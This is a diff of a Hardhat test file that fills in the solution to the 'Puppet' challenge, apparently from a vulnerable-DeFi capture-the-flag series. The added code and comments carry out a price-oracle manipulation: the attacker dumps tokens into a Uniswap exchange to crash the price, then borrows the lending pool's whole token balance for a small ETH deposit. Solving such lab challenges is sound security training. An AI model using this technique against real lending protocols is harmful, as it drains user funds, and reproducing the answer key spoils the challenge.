@@ -103,10 +103,13 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // approve uniswap to transfer 1000 tokens
         await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
-        // await this.uniswapExchange.connect(attacker).tokenToEthSwapOutput(UNISWAP_INITIAL_ETH_RESERVE.div("100").mul("99"), ATTACKER_INITIAL_TOKEN_BALANCE, (await ethers.provider.getBlock('latest')).timestamp * 2);
+        // dump the tokens in uniswap to manipulate the price
         await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub("1"), UNISWAP_INITIAL_ETH_RESERVE.div("100").mul("99"), (await ethers.provider.getBlock('latest')).timestamp * 2);
+        // calculate how much eth we need to take all the tokens from the pool
         const depositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        // borrow all the tokens from the pool
         await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: depositRequired });
     });
 
